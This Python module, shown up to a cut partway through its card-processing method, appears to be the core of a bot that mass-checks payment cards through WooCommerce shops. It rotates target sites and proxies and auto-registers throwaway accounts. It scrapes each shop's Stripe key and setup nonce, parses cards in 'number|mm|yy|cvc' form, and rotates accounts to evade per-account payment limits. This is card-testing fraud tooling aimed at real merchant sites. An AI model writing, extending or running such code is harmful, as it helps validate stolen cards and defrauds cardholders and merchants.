# ============================================================
# 💤 Optional: Toggleable debug print silencer
# ============================================================
import builtins
DEBUG_MODE = False  # set True if you want to see prints again

def _silent_print(*args, **kwargs):
    if DEBUG_MODE:
        builtins._orig_print(*args, **kwargs)

if not hasattr(builtins, "_orig_print"):
    builtins._orig_print = builtins.print
builtins.print = _silent_print

import shutil
import os
import re
import json
import time
import random
import string
import threading
import requests
import glob
from config import DEFAULT_API_URL
from urllib.parse import urlparse
from requests.utils import dict_from_cookiejar, cookiejar_from_dict
from requests.adapters import HTTPAdapter
from requests.exceptions import ProxyError, ConnectTimeout, ConnectionError, ReadTimeout, SSLError
from config import PAYMENT_LIMIT, RETRY_COUNT, RETRY_DELAY
from runtime_config import get_all_default_sites, get_default_site
from user_agents import get_random_user_agent
from woo_helpers import (
    build_registration_payload,
    build_login_payload,
    is_logged_in,
)

from proxy_manager import get_user_proxy


# ==========================================================
# SESSION CACHE (for fast session reuse)
# ==========================================================
_session_cache = {}  # {(chat_id, site_url, worker_id): session}
_session_cache_lock = threading.Lock()


def _get_session_cache_key(chat_id, site_url, worker_id=None):
    """Generate cache key for session storage."""
    return (str(chat_id), str(site_url), worker_id)


def _get_cached_session(chat_id, site_url, worker_id=None):
    """Get cached session if available and valid."""
    key = _get_session_cache_key(chat_id, site_url, worker_id)
    with _session_cache_lock:
        return _session_cache.get(key)


def _set_cached_session(chat_id, site_url, session, worker_id=None):
    """Cache a session for reuse."""
    key = _get_session_cache_key(chat_id, site_url, worker_id)
    with _session_cache_lock:
        _session_cache[key] = session


def _clear_cached_session(chat_id, site_url, worker_id=None):
    """Clear cached session (e.g., on rotation or failure)."""
    key = _get_session_cache_key(chat_id, site_url, worker_id)
    with _session_cache_lock:
        _session_cache.pop(key, None)


# ==========================================================
# RANDOM / ROUND-ROBIN SITE PICKER
# ==========================================================

_site_rotation = {}
_site_lock = threading.Lock()

def get_next_user_site(chat_id):
    """
    Return a different site for each check — round-robin random rotation.
    Once all sites are used, reshuffles the list.
    """
    chat_id = str(chat_id)
    state = _load_state(chat_id)
    user_data = state.get(chat_id, {})
    sites = list(user_data.get("sites", {}).keys())

    if not sites:
        from runtime_config import get_default_site
        return get_default_site()

    with _site_lock:
        rotation_entry = _site_rotation.get(chat_id)

        # Backwards compatibility with legacy list format
        if isinstance(rotation_entry, list):
            rotation_entry = {
                "remaining": rotation_entry,
                "snapshot": list(rotation_entry),
            }

        site_set = set(sites)
        if (
            not rotation_entry
            or set(rotation_entry.get("snapshot", [])) != site_set
        ):
            shuffled = sites[:]
            random.shuffle(shuffled)
            rotation_entry = {
                "remaining": shuffled,
                "snapshot": list(sites),
            }

        remaining = rotation_entry.get("remaining", [])
        if not remaining:
            remaining = sites[:]
            random.shuffle(remaining)
            rotation_entry["remaining"] = remaining
            rotation_entry["snapshot"] = list(sites)

        next_site = rotation_entry["remaining"].pop(0)

        if not rotation_entry["remaining"]:
            refreshed = sites[:]
            random.shuffle(refreshed)
            rotation_entry["remaining"] = refreshed
            rotation_entry["snapshot"] = list(sites)

        _site_rotation[chat_id] = rotation_entry
        return next_site



def _get_user_site_file(chat_id):
    """Return per-user JSON path inside /sites/<chat_id>/ folder."""
    if not chat_id or chat_id == "global":
        raise ValueError("chat_id required for per-user site storage")

    user_dir = os.path.join("sites", str(chat_id))
    os.makedirs(user_dir, exist_ok=True)

    return os.path.join(user_dir, f"sites_{chat_id}.json")


_save_lock = threading.Lock()


def _normalize_site_key(site_url: str) -> str:
    """
    Normalize site URL to scheme://netloc without trailing slash.
    Ensures consistent comparisons when adding/removing sites.
    """
    try:
        site_url = (site_url or "").strip()
        if not site_url:
            return ""
        if not site_url.startswith(("http://", "https://")):
            site_url = f"https://{site_url}"
        parsed = urlparse(site_url)
        if parsed.scheme and parsed.netloc:
            return f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
    except Exception:
        pass
    return site_url.rstrip("/")


# ==========================================================
# STATE HELPERS
# ==========================================================
def _load_state(chat_id: str):
    path = _get_user_site_file(chat_id)
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return _migrate_state_format(data)
        except Exception:
            pass
    return {}


def _migrate_state_format(state):
    """
    Auto-convert old site JSONs to the new format (under 'sites' key).
    """
    migrated = {}
    for uid, data in state.items():
        if isinstance(data, dict) and "sites" not in data:
            migrated[uid] = {"sites": data}
        else:
            migrated[uid] = data
    return migrated


def get_user_site(chat_id):
    """
    Returns the first site URL for this user from their per-user sites JSON.
    Falls back to runtime default if none found.
    """
    chat_id = str(chat_id)
    state = _load_state(chat_id)
    user_data = state.get(chat_id, {})

    sites = user_data.get("sites", {})
    if sites:
        return next(iter(sites.keys()))

    # Fallback
    return get_default_site()



def _save_state(state, chat_id: str):
    """Save user site state safely with 'sites' preserved."""
    path = _get_user_site_file(chat_id)
    with _save_lock:
        cleaned = {}
        for uid, user_data in state.items():
            if isinstance(user_data, dict):
                cleaned[uid] = {"sites": user_data.get("sites", {})}
            else:
                cleaned[uid] = {"sites": {}}

        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(cleaned, f, indent=2)
        os.replace(tmp, path)
# --- Step 1: helper to remove a user's dead site safely ---
def remove_user_site(chat_id: str, site_url: str, worker_id: int | None = None) -> bool:
    """
    Remove a site from the user's JSON state if it exists.
    Returns True if a site entry was removed, False otherwise.
    Uses the same save lock as _save_state for thread safety.
    """
    try:
        chat_id = str(chat_id)
        target = _normalize_site_key(site_url)
        if not target:
            return False
        state = _load_state(chat_id) or {}
        user_entry = state.get(chat_id)
        if not user_entry:
            return False

        sites = user_entry.get("sites", {})
        removed = False
        keys_to_remove = [
            existing_key
            for existing_key in list(sites.keys())
            if _normalize_site_key(existing_key) == target
        ]

        if keys_to_remove:
            for key in keys_to_remove:
                del sites[key]
            snapshot = user_entry.get("defaults_snapshot")
            if isinstance(snapshot, list):
                user_entry["defaults_snapshot"] = [
                    snap for snap in snapshot if _normalize_site_key(snap) != target
                ]
            _save_state(state, chat_id)
            removed = True
            print(f"[REMOVE_SITE] Removed dead site for user {chat_id}: {target}")

        # Also remove from worker-specific site files so the dead site cannot be reused.
        user_dir = os.path.join("sites", chat_id)
        if os.path.isdir(user_dir):
            pattern = f"sites_{chat_id}_{worker_id}.json" if worker_id else f"sites_{chat_id}_*.json"
            for path in glob.glob(os.path.join(user_dir, pattern)):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        worker_state = json.load(f)
                    worker_entry = worker_state.get(chat_id, {}).get("sites", {})
                    worker_keys_to_remove = [
                        existing_key
                        for existing_key in list(worker_entry.keys())
                        if _normalize_site_key(existing_key) == target
                    ]
                    if worker_keys_to_remove:
                        for key in worker_keys_to_remove:
                            del worker_state[chat_id]["sites"][key]
                        snapshot = worker_state.get(chat_id, {}).get("defaults_snapshot")
                        if isinstance(snapshot, list):
                            worker_state[chat_id]["defaults_snapshot"] = [
                                snap for snap in snapshot if _normalize_site_key(snap) != target
                            ]
                        with open(path, "w", encoding="utf-8") as f:
                            json.dump(worker_state, f, indent=2)
                        print(f"[REMOVE_SITE] Removed dead site from {os.path.basename(path)} for user {chat_id}")
                        removed = True
                except Exception as e:
                    print(f"[REMOVE_SITE ERROR] Failed to update {path}: {e}")

        return removed
    except Exception as e:
        print(f"[REMOVE_SITE ERROR] {e}")
    return False
        
def replace_user_sites(chat_id, new_sites):
    """
    Replace a user's site list with new ones.
    Deletes the old 'sites' and creates fresh ones from new_sites.
    Each site URL is normalized and saved under the user's ID.
    """
    chat_id = str(chat_id)
    state = _load_state(chat_id)
    state.setdefault(chat_id, {"sites": {}})
    state[chat_id]["sites"].clear()
    from config import MAX_WORKERS
    clone_user_site_files(chat_id, MAX_WORKERS)


    for raw_url in new_sites:
        site = str(raw_url).strip()
        if not site:
            continue
        if not site.startswith("http"):
            site = "https://" + site

        domain = site.replace("https://", "").replace("http://", "").split("/")[0]
        state[chat_id]["sites"][site] = {
            "accounts": [],
            "cookies": None,
            "payment_count": 0,
            "mode": "rotate"
        }

    _save_state(state, chat_id)
    print(f"[UPDATE_SITES] {chat_id} replaced site list: {list(state[chat_id]['sites'].keys())}")
    from config import MAX_WORKERS
    clone_user_site_files(chat_id, MAX_WORKERS)    
    return list(state[chat_id]["sites"].keys())



def ensure_user_site_exists(chat_id):
    """Ensure per-user site JSON exists, and sync with admin’s current defaults if needed."""
    try:
        chat_id = str(chat_id)
        sites_dir = os.path.join(os.getcwd(), "sites", chat_id)
        os.makedirs(sites_dir, exist_ok=True)
        file_path = os.path.join(sites_dir, f"sites_{chat_id}.json")

        # ✅ Current runtime defaults (set by admin)
        runtime_defaults = get_all_default_sites()

        # ----------------------------------------------------
        # 🆕 Case 1: File does NOT exist — create fresh defaults
        # ----------------------------------------------------
        if not os.path.exists(file_path):
            user_data = {
                chat_id: {
                    "sites": {},
                    "defaults_snapshot": runtime_defaults
                }
            }

            for site_url in runtime_defaults:
                user_data[chat_id]["sites"][site_url] = {
                    "accounts": [],
                    "cookies": None,
                    "payment_count": 0,
                    "mode": "rotate"
                }

            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(user_data, f, indent=2)
            print(f"[AUTO-SITE] Created site file for {chat_id} with defaults.")
            return

        # ----------------------------------------------------
        # 🩹 Case 2: File exists — check if defaults changed
        # ----------------------------------------------------
        with open(file_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        user_entry = data.get(chat_id, {})
        snapshot = user_entry.get("defaults_snapshot", [])
        sites = user_entry.get("sites", {})

        # 🧩 If user still using defaults and admin changed them — refresh
        if set(sites.keys()) == set(snapshot) and snapshot != runtime_defaults:
            print(f"[AUTO-SYNC] Admin updated defaults; refreshing for user {chat_id}")
            new_sites = {
                site: {
                    "accounts": [],
                    "cookies": None,
                    "payment_count": 0,
                    "mode": "rotate"
                }
                for site in runtime_defaults
            }
            data[chat_id] = {"sites": new_sites, "defaults_snapshot": runtime_defaults}

            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            print(f"[AUTO-SYNC] User {chat_id} defaults refreshed.")
        else:
            print(f"[AUTO-SITE] Site file already exists for {chat_id}")

    except Exception as e:
        print(f"[AUTO-SITE ERROR] {chat_id}: {e}")








# ==========================================================
# SAFE REQUEST (Single-proxy with stop check + fallback)
# ==========================================================
def safe_request(session, method, url, **kwargs):
    """
    Thread-safe request with STOP responsiveness and proxy fallback.
    If proxy fails (Tunnel connection failed, 407, etc.), it instantly
    disables proxy and retries once using direct IP.
    """
    if session is None or not hasattr(session, method.lower()):
        return None

    from requests.exceptions import ProxyError, ConnectTimeout, ConnectionError, ReadTimeout, SSLError
    from mass_check import is_stop_requested
    import requests, time

    chat_id = getattr(session, "chat_id", "unknown")

    RETRY_COUNT = 2
    RETRY_DELAY = 1
    TIMEOUT = kwargs.get("timeout", 7)
    proxy_failed = False

    for attempt in range(RETRY_COUNT + 1):
        if is_stop_requested(str(chat_id)):
            print(f"[SAFE_REQUEST STOP] User {chat_id} requested stop before attempt {attempt+1}")
            return None

        try:
            if method.lower() == "get":
                response = session.get(url, timeout=TIMEOUT, **{k: v for k, v in kwargs.items() if k != "timeout"})
            elif method.lower() == "post":
                response = session.post(url, timeout=TIMEOUT, **{k: v for k, v in kwargs.items() if k != "timeout"})
            else:
                raise ValueError(f"Unsupported method: {method}")

            if is_stop_requested(str(chat_id)):
                print(f"[SAFE_REQUEST STOP] User {chat_id} requested stop after request")
                return None

            return response

        except (ProxyError, ConnectTimeout, ConnectionError, ReadTimeout, SSLError) as e:
            # 🧩 Detect proxy failure on first occurrence
            if getattr(session, "_used_proxy", False):
                proxy_failed = True
                print(f"[ERROR] Proxy connection error: {e}")
                print(f"[WARN] Falling back to direct IP for user {chat_id}")
                session.proxies = {}
                session._used_proxy = False
                session._proxy_status = "Proxy None"
                continue  # Retry immediately without proxy

            print(f"[SAFE_REQUEST RETRY] {e} (attempt {attempt+1})")

            if is_stop_requested(str(chat_id)):
                print(f"[SAFE_REQUEST STOP] User {chat_id} requested stop during retry delay")
                return None

            time.sleep(RETRY_DELAY)
            continue

        except Exception as e:
            print(f"[SAFE_REQUEST ERROR] {e}")
            if is_stop_requested(str(chat_id)):
                print(f"[SAFE_REQUEST STOP] User {chat_id} requested stop after exception")
                return None
            time.sleep(RETRY_DELAY)

    print(f"[SAFE_REQUEST FAIL] All retries exhausted for {chat_id}")

    # ✅ Record proxy status
    if proxy_failed:
        session._proxy_status = "Proxy None"
    elif getattr(session, "_used_proxy", False):
        session._proxy_status = "Proxy Live"
    else:
        session._proxy_status = "Proxy None"

    print(f"[DEBUG] safe_request finished for user {chat_id} with status {session._proxy_status}")
    return None



# ==========================================================
# RANDOM UTILITIES
# ==========================================================
def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_random_email():
    return f"{generate_random_string()}@gmail.com"


def generate_random_username():
    return f"user_{generate_random_string(8)}"


# ==========================================================
# MAIN CLASS
# ==========================================================
class SiteAuthManager:
    def __init__(self, site_url, chat_id, proxy=None, worker_id=None):
        self.worker_id = worker_id

        # 🔹 Clean and normalize the input
        site_url = str(site_url).strip()

        # ✅ If no http/https scheme, automatically add https://
        if not site_url.startswith("http"):
            if site_url.startswith("www."):
                site_url = f"https://{site_url}"
            else:
                site_url = f"https://{site_url}"

        # 🔹 Parse and extract the base URL (no path)
        parsed = urlparse(site_url)
        base = f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
        self.site_url = base

        # 🔹 Define related URLs
        self.register_url = f"{self.site_url}/my-account/"
        self.payment_url = f"{self.site_url}/my-account/add-payment-method/"

        # 🔹 Store user-specific data
        self.chat_id = str(chat_id)
        self.proxy = proxy
        self._used_proxy = bool(proxy)
        self._proxy_status = "Proxy Live" if proxy else "Proxy None"
        if worker_id:
            worker_file = os.path.join("sites", str(chat_id), f"sites_{chat_id}_{worker_id}.json")
            os.makedirs(os.path.dirname(worker_file), exist_ok=True)
            if not os.path.exists(worker_file):
                # create from base if missing
                base = _get_user_site_file(chat_id)
                if os.path.exists(base):
                    shutil.copy(base, worker_file)
                else:
                    ensure_user_site_exists(chat_id)
                    shutil.copy(_get_user_site_file(chat_id), worker_file)
            with open(worker_file, "r", encoding="utf-8") as f:
                self.state = json.load(f)
            self._user_site_file = worker_file
        else:
            self.state = _load_state(self.chat_id)
            self._user_site_file = _get_user_site_file(self.chat_id)


        # 🔹 Ensure this site entry exists for this user
        self._ensure_entry()
        with open(self._user_site_file, "w", encoding="utf-8") as f:
            json.dump(self.state, f, indent=2)




    def _ensure_entry(self):
        self.state.setdefault(self.chat_id, {"sites": {}})

        from runtime_config import get_default_site
        default_url = get_default_site()

        # ✅ Ensure 'sites' key exists
        sites = self.state[self.chat_id].setdefault("sites", {})

        # ✅ Auto-add default site for new users
        if not sites:
            sites[default_url] = {
                "accounts": [],
                "cookies": None,
                "payment_count": 0,
                "mode": "rotate"
            }
            print(f"[AUTO-SITE] Added default site for new user {self.chat_id}: {default_url}")

        # ✅ Ensure current site also exists
        if self.site_url not in sites:
            sites[self.site_url] = {
                "accounts": [],
                "cookies": None,
                "payment_count": 0,
                "mode": "rotate"
            }

        with open(self._user_site_file, "w", encoding="utf-8") as f:
            json.dump(self.state, f, indent=2)






    # ----------------------------------------------------------
    # NEW SESSION
    # ----------------------------------------------------------
    def _new_session(self):
        import base64, requests

        s = requests.Session()
        s.chat_id = self.chat_id
        raw_proxy = get_user_proxy(self.chat_id)

        # --- 1️⃣ Try to assign proxy immediately ---
        if raw_proxy:
            if raw_proxy.get("user") and raw_proxy.get("pass"):
                auth = f"{raw_proxy['user']}:{raw_proxy['pass']}@"
            else:
                auth = ""

            proxy_url = f"http://{auth}{raw_proxy['host']}:{raw_proxy['port']}"
            s.proxies = {"http": proxy_url, "https": proxy_url}
            s._used_proxy = True

            # Optional Proxy-Authorization header (helps Rayobyte/IPRoyal)
            try:
                encoded = base64.b64encode(f"{raw_proxy['user']}:{raw_proxy['pass']}".encode()).decode()
                s.headers.update({"Proxy-Authorization": f"Basic {encoded}"})
            except Exception:
                pass

            print(f"[DEBUG] Using proxy for user {self.chat_id}: {s.proxies}")
        else:
            print(f"[DEBUG] No proxy set for user {self.chat_id}. Using direct IP.")
            s.proxies = {}
            s._used_proxy = False

        # --- 2️⃣ Mark proxy status for other modules ---
        s._proxy_status = "Proxy Live" if getattr(s, "_used_proxy", False) else "Proxy None"

        return s






    # ----------------------------------------------------------
    # LOGIN EXISTING ACCOUNT
    # ----------------------------------------------------------
    def _login_existing_account(self, session, account):
        if session is None or not isinstance(session, requests.Session):
            session = self._new_session()

        headers = {"User-Agent": get_random_user_agent(), "Referer": self.register_url}
        try:
            page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
            if not hasattr(page, "text") or not page.text:
                return None

            login_html = page.text or ""
            identifiers = []
            if account.get("username"):
                identifiers.append(account["username"])
            if account.get("email") and account["email"] not in identifiers:
                identifiers.append(account["email"])

            for idx, identifier in enumerate(identifiers):
                payload = build_login_payload(login_html, identifier, account["password"])
                resp = safe_request(session, "post", self.register_url, headers=headers, data=payload, timeout=20)
                if hasattr(resp, "text") and is_logged_in(resp.text):
                    entry = self.state[self.chat_id]["sites"][self.site_url]
                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
                    entry["raw_cookies"] = session.cookies.get_dict(
                        domain=self.site_url.replace("https://", "").replace("http://", "")
                    )
                    with open(self._user_site_file, "w", encoding="utf-8") as f:
                        json.dump(self.state, f, indent=2)
                    return session

                # Refresh login page for next identifier
                if idx + 1 < len(identifiers):
                    page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
                    login_html = page.text if page and hasattr(page, "text") else ""

            return None

        except Exception:
            return None

    # ----------------------------------------------------------
    # REGISTER NEW ACCOUNT
    # ----------------------------------------------------------
    def _register_new_account(self, session):
        if session is None or not isinstance(session, requests.Session):
            session = self._new_session()

        headers = {"User-Agent": get_random_user_agent(), "Referer": self.register_url}
        email = generate_random_email()
        username = generate_random_username()
        password = generate_random_string(12)
        first_name = generate_random_string(6).title()
        last_name = generate_random_string(6).title()

        try:
            page = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
            if not page or not hasattr(page, "text"):
                return None

            registration_html = page.text or ""
            payload = build_registration_payload(
                registration_html,
                email=email,
                username=username,
                password=password,
                first_name=first_name,
                last_name=last_name,
            )

            if not payload:
                return None

            resp = safe_request(session, "post", self.register_url, headers=headers, data=payload, timeout=20)
            if not resp or not hasattr(resp, "text"):
                return None

            if not is_logged_in(resp.text):
                verify = safe_request(session, "get", self.register_url, headers=headers, timeout=10)
                if not verify or not is_logged_in(getattr(verify, "text", "")):
                    return None

            entry = self.state[self.chat_id]["sites"][self.site_url]
            entry["accounts"] = [{
                "email": email,
                "username": username,
                "password": password
            }]
            entry["payment_count"] = 0
            entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
            entry["raw_cookies"] = session.cookies.get_dict(
                domain=self.site_url.replace("https://", "").replace("http://", "")
            )
            with open(self._user_site_file, "w", encoding="utf-8") as f:
                json.dump(self.state, f, indent=2)

            session._account_credentials = {
                "email": email,
                "username": username,
                "password": password,
            }
            return session

        except Exception:
            return None
    # ----------------------------------------------------------
    # FETCH PK AND NONCE
    # ----------------------------------------------------------
    def _fetch_pk_and_nonce(self, session, headers):
        """
        OPTIMIZED: Fetch or reuse Stripe public key (pk_) and nonce from add-payment-method page.
        - Reuses cached PK permanently (site-specific, not account-specific)
        - Only authenticates if session is invalid (trust until failure)
        - Minimizes HTTP requests - only fetches nonce when needed
        """
        try:
            # 🧩 Load user's current site record
            entry = self.state.get(self.chat_id, {}).get("sites", {}).get(self.site_url, {})
            cached_pk = entry.get("stripe_pk")
            cached_nonce = entry.get("stripe_nonce")

            # ✅ Reuse cached PK if available (PK is site-specific, cache permanently)
            if cached_pk and isinstance(cached_pk, str) and cached_pk.startswith("pk_"):
                print(f"[DEBUG] Using cached Stripe PK → {cached_pk[:25]}...")
                pk = cached_pk
            else:
                pk = None

            # ✅ FAST: If we have PK and a valid cached session, try to use cached nonce first
            # Nonces can be reused for a short time, so we'll try it and only fetch fresh if it fails
            if pk and cached_nonce and session:
                # Try using cached nonce - if it fails, we'll fetch fresh one
                print(f"[DEBUG] Using cached nonce → {cached_nonce} (will fetch fresh if needed)")
                return pk, cached_nonce

            # ✅ FAST: Try to fetch payment page (session should already be authenticated)
            # Trust the session - only re-authenticate if we get actual failure (401/403 or login page detected)
            print("[DEBUG] Fetching payment page for nonce...")
            resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
            
            # Check for authentication failure
            if resp and hasattr(resp, 'status_code') and resp.status_code in (401, 403):
                print("[DEBUG] Got 401/403 → session expired, re-authenticating.")
                # Session expired - need to re-authenticate
                if entry.get("accounts"):
                    session = self._login_existing_account(self._new_session(), entry["accounts"][-1])
                else:
                    session = self._register_new_account(self._new_session())
                
                if not session:
                    print("[ERROR] Re-authentication failed.")
                    return pk, cached_nonce
                
                # Update cached session
                _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
                
                # Retry fetching payment page
                resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
                if not resp or resp.status_code not in (200, 302):
                    print("[ERROR] Failed to fetch payment page after re-auth.")
                    return pk, cached_nonce
            
            if not resp or resp.status_code not in (200, 302):
                print("[ERROR] No HTML response from site while fetching PK/Nonce.")
                return pk, cached_nonce

            html_text = resp.text

            # 🧩 FAST: Only authenticate if we detect login page (trust session until failure)
            # Check more carefully - look for positive indicators of being logged in first
            is_logged_in_check = (
                "customer-logout" in html_text 
                or "My account" in html_text 
                or "Logout" in html_text
                or "woocommerce-MyAccount" in html_text
                or "add-payment-method" in html_text.lower()  # Payment page itself indicates logged in
            )
            
            # Only treat as login page if we're NOT logged in AND we see login form
            # Be more strict - remove the small page check as it's too aggressive
            is_login_page = (
                not is_logged_in_check 
                and (
                    ("username" in html_text and "password" in html_text and ("login" in html_text.lower() or "sign in" in html_text.lower()))
                    or "Lost your password" in html_text
                )
            )
            
            if is_login_page:
                print("[DEBUG] Detected login form → session expired, re-authenticating.")
                # Session expired - need to re-authenticate
                if entry.get("accounts"):
                    session = self._login_existing_account(self._new_session(), entry["accounts"][-1])
                else:
                    session = self._register_new_account(self._new_session())
                
                if not session:
                    print("[ERROR] Re-authentication failed.")
                    return pk, cached_nonce
                
                # Update cached session
                _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
                
                # Retry fetching payment page
                resp = safe_request(session, "get", self.payment_url, headers=headers, timeout=10)
                if not resp or resp.status_code != 200:
                    print("[ERROR] Failed to fetch payment page after re-auth.")
                    return pk, cached_nonce
                html_text = resp.text

            # ✅ Extract PK if not cached
            if not pk:
                pk_match = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]{8,}', html_text)
                if pk_match:
                    pk = pk_match.group(0)
                    print(f"[DEBUG] Stripe PK fetched → {pk[:30]}...")
                else:
                    print("[WARN] Stripe PK not found in HTML.")

            # ✅ Extract Nonce (always fetch fresh nonce as it changes)
            nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', html_text)
            nonce = nonce_match.group(1) if nonce_match else cached_nonce

            # ✅ Save PK permanently (only if new), update nonce
            if pk and pk != cached_pk:
                entry["stripe_pk"] = pk
            if nonce:
                entry["stripe_nonce"] = nonce
            self.state[self.chat_id]["sites"][self.site_url] = entry
            with open(self._user_site_file, "w", encoding="utf-8") as f:
                json.dump(self.state, f, indent=2)

            if not pk or not nonce:
                print("[ERROR] Missing Stripe PK or Nonce → site issue.")
                return pk, nonce

            print(f"[DEBUG] Stripe PK: {pk[:30]}..., Nonce: {nonce}")
            return pk, nonce

        except Exception as e:
            print(f"[ERROR] _fetch_pk_and_nonce failed: {e}")
            return None, None





    # ----------------------------------------------------------
    # PROCESS CARD (OPTIMIZED - fast session reuse)
    # ----------------------------------------------------------
    def process_card(self, ccx):
        from mass_check import is_stop_requested  # ensure callable
        entry = self.state[self.chat_id]["sites"][self.site_url]

        print(f"\n[DEBUG] ===== Processing Card for {self.chat_id} on {self.site_url} =====")

        # 🛑 Stop checkpoint
        if is_stop_requested(self.chat_id):
            print("[STOP] User stop requested before processing.")
            return {"status": "DECLINED", "reason": "User stopped process"}

        # ✅ FAST: Try to reuse cached session first
        session = _get_cached_session(self.chat_id, self.site_url, self.worker_id)
        needs_auth = False
        state_changed = False

        # ✅ FAST: If we have an account AND a cached session, skip all authentication - go directly to Stripe
        has_account = bool(entry.get("accounts"))
        if has_account and session:
            # Restore cookies to session if available
            if entry.get("raw_cookies"):
                try:
                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
                    for k, v in entry["raw_cookies"].items():
                        if v:
                            session.cookies.set(k, v, domain=base_domain, path="/")
                except Exception as e:
                    print(f"[DEBUG] Failed to restore cookies: {e}")
            # Skip authentication - go directly to Stripe
            print("[DEBUG] ✅ Account exists and session cached - going directly to Stripe API (no authentication).")
        else:
            # Need to check authentication requirements
            if not has_account:
                # First time - need to register
                print("[DEBUG] No existing account, will create new one.")
                needs_auth = True
            elif entry.get("payment_count", 0) >= PAYMENT_LIMIT:
                # Payment limit reached - rotate account (register new)
                print(f"[DEBUG] Payment limit reached ({PAYMENT_LIMIT}), rotating account (registering new).")
                entry.clear()
                entry.update({
                    "accounts": [],
                    "cookies": None,
                    "raw_cookies": None,
                    "cookies_valid": False,
                    "payment_count": 0,
                    "mode": "rotate",
                    "pk": None,
                    "pk_usage": 0
                })
                _clear_cached_session(self.chat_id, self.site_url, self.worker_id)
                needs_auth = True
                state_changed = True
            elif session is None:
                # Have account but no cached session - need to login
                print("[DEBUG] Account exists but no cached session, will login.")
                needs_auth = True
            else:
                # Have account and session but something is wrong - try to restore cookies
                if entry.get("raw_cookies"):
                    try:
                        base_domain = self.site_url.replace("https://", "").replace("http://", "")
                        for k, v in entry["raw_cookies"].items():
                            if v:
                                session.cookies.set(k, v, domain=base_domain, path="/")
                        print("[DEBUG] ✅ Restored cookies to session - going directly to Stripe API.")
                    except Exception as e:
                        print(f"[DEBUG] Failed to restore cookies, will login: {e}")
                        needs_auth = True
                else:
                    print("[DEBUG] No cookies saved, will login.")
                    needs_auth = True

        # Authenticate only when needed
        if needs_auth:
            if not entry.get("accounts"):
                # Register new account (only happens on first card or after payment limit)
                print("[DEBUG] Registering new account...")
                session = self._register_new_account(self._new_session())
                if session:
                    entry["payment_count"] = 1
                    # Ensure cookies are saved
                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
                    state_changed = True
                    # Cache the session
                    _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
                    print("[DEBUG] Account registered and session cached.")
            else:
                # Login with existing account (only if session cache is empty)
                print("[DEBUG] Logging in with existing account...")
                last_acc = entry["accounts"][-1]
                session = self._login_existing_account(self._new_session(), last_acc)
                if not session:
                    # Login failed, register new account
                    print("[DEBUG] Login failed, registering new account.")
                    session = self._register_new_account(self._new_session())
                    entry["payment_count"] = 1
                    # Ensure cookies are saved
                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
                    state_changed = True
                else:
                    entry["payment_count"] += 1
                    # Ensure cookies are saved
                    entry["cookies"] = requests.utils.dict_from_cookiejar(session.cookies)
                    base_domain = self.site_url.replace("https://", "").replace("http://", "")
                    entry["raw_cookies"] = session.cookies.get_dict(domain=base_domain)
                    state_changed = True

                # Cache the authenticated session
                if session:
                    _set_cached_session(self.chat_id, self.site_url, session, self.worker_id)
                    print("[DEBUG] Session authenticated and cached.")
        else:
            # ✅ FAST PATH: Reuse existing session - just increment counter, no authentication
            entry["payment_count"] = entry.get("payment_count", 0) + 1
            state_changed = True

        # Save state only if it changed
        if state_changed:
            with open(self._user_site_file, "w", encoding="utf-8") as f:
                json.dump(self.state, f, indent=2)


        # Parse card
        try:
            n, mm, yy, cvc = ccx.strip().split("|")
            mm, yy, cvc = mm.strip(), yy.strip(), cvc.strip()
            print(f"[DEBUG] Parsed card: {n[:6]}********{n[-4:]} | {mm}/{yy} | {cvc}")
        except Exception:
            return {"status": "DECLINED", "reason": "Invalid Card Format"}
        # ============================================================
        # 🧩 Basic Format Validation BEFORE Stripe Request
        # ============================================================
        # Ensure card number only digits and correct length (13–19)
        if not n.isdigit() or len(n) < 13 or len(n) > 19:
            print(f"[VALIDATION FAIL] Invalid card number length or non-digit characters: {n}")
            return {
                "status": "DECLINED",
                "reason": "Your card number is incorrect.",
                "source": "local"
            }

        # Ensure expiry month/year valid
        if not mm.isdigit() or not yy.isdigit():
            return {
                "status": "DECLINED",
                "reason": "Invalid expiry date format.",
                "source": "local"
            }

        mm_int = int(mm)
        yy_int = int(yy[-2:]) if len(yy) in (2, 4) else 0

        if mm_int < 1 or mm_int > 12:
            return {
                "status": "DECLINED",
                "reason": "Invalid expiry month.",
                "source": "local"
            }

        # Ensure CVC is numeric and 3 or 4 digits
        if not cvc.isdigit() or len(cvc) not in (3, 4):
            print(f"[VALIDATION FAIL] CVC invalid length: {len(cvc)}")
            return {
                "status": "DECLINED",
                "reason": "Your card number is incorrect.",
                "source": "local"
            }

        # Stripe: fetch PK + nonce
        headers = {"User-Agent": get_random_user_agent(), "Referer": self.payment_url}
        pk, nonce = self._fetch_pk_and_nonce(session, headers)
        print(f"[DEBUG] Stripe PK: {pk}, Nonce: {nonce}")

        if not pk or not nonce:
            print("[ERROR] Missing Stripe PK or Nonce → site issue.")
